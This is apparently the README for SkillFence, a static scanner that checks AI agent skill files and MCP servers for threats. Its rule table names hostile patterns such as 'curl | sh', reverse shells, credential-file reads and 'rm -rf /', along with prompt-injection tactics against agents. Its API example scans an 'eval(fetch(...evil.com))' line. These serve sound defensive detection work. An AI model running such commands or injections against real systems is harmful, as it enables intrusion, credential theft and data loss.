# 🛡️ SkillFence

**Security scanner for AI agent skills, MCP servers, and tool configs.**

> 43% of MCP servers have critical vulnerabilities. SkillFence catches them before your agents get pwned.

[![npm version](https://img.shields.io/npm/v/skillfence)](https://www.npmjs.com/package/skillfence)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## Why?

The Model Context Protocol (MCP) ecosystem is exploding — and so are supply chain attacks. In the first 60 days of 2026, **30+ CVEs** were filed against MCP servers. Tool poisoning, prompt injection, credential theft — all hiding in skill files that agents blindly trust.

SkillFence is a static analysis scanner that catches these threats before installation.

## Quick Start

```bash
# Scan current directory
npx skillfence scan .

# Scan a specific file
npx skillfence scan SKILL.md

# Pipe content
cat suspicious-skill.md | npx skillfence scan --stdin

# JSON output for CI/CD
npx skillfence scan . --json
```

## What It Detects

**35 detection rules** mapped to [OWASP MCP Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/):

| Category | Rules | Examples |
|----------|-------|---------|
| 🔴 Remote Code Execution | 6 | `curl \| sh`, reverse shells, encoded PowerShell |
| 💉 Code Injection | 6 | `eval()`, `exec()`, `os.system()`, `subprocess` |
| 🔑 Credential Access | 8 | `.ssh/`, `.aws/`, API keys, `.env` files, agent memory |
| 📡 Data Exfiltration | 5 | IP-based URLs, base64 obfuscation, webhook services |
| 🧠 Prompt Injection | 5 | Instruction override, role hijacking, control tokens |
| 💥 Destructive Ops | 3 | `rm -rf /`, `chmod 777`, disk formatting |

```
$ npx skillfence rules    # List all 35 rules with OWASP mappings
```

## Exit Codes

| Code | Verdict | Meaning |
|------|---------|---------|
| `0` | ✅ CLEAN | No findings |
| `1` | ◉ REVIEW | Low/medium findings |
| `2` | ⚠️ WARN | High severity findings |
| `3` | ✗ BLOCK | Critical findings — do not install |

Perfect for CI/CD:

```bash
npx skillfence scan . --quiet || exit 1
```

## Output Formats

```bash
skillfence scan .           # Pretty terminal output (default)
skillfence scan . --json    # JSON (for programmatic use)
skillfence scan . --sarif   # SARIF (for GitHub Code Scanning)
skillfence scan . --quiet   # Just verdict + exit code
```

## GitHub Action

```yaml
# .github/workflows/skillfence.yml
name: SkillFence Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npx skillfence scan . --quiet
```

## API

Use as a library:

```javascript
const { scanContent, scanDirectory } = require('skillfence');

// Scan a string
const result = scanContent('eval(fetch("http://evil.com"))');
console.log(result.verdict); // "WARN"
console.log(result.findings); // [{id: "INJ-001", severity: "HIGH", ...}]

// Scan a directory
const dirResult = scanDirectory('./my-skill');
console.log(dirResult.totalFindings); // 3
```

## Comparison

| Feature | SkillFence | agent-audit | sinewave-scanner |
|---------|-----------|-------------|-----------------|
| Language | Node.js | Python | JavaScript |
| Rules | 35 | 49 | ~20 |
| OWASP mapping | ✅ | ✅ | ❌ |
| SARIF output | ✅ | ❌ | ❌ |
| npm/npx | ✅ | ❌ (pip) | ❌ (MCP server) |
| Trust certificates | ✅ (API) | ❌ | ❌ |
| Fix suggestions | ✅ | ❌ | ❌ |
| Zero deps | ✅ | ❌ | ❌ |

## Contributing

Found a pattern we should detect? [Open an issue](https://github.com/hhhashexe/skillfence/issues) or submit a PR to `lib/patterns.js`.

## License

MIT — [hhhashexe](https://github.com/hhhashexe)
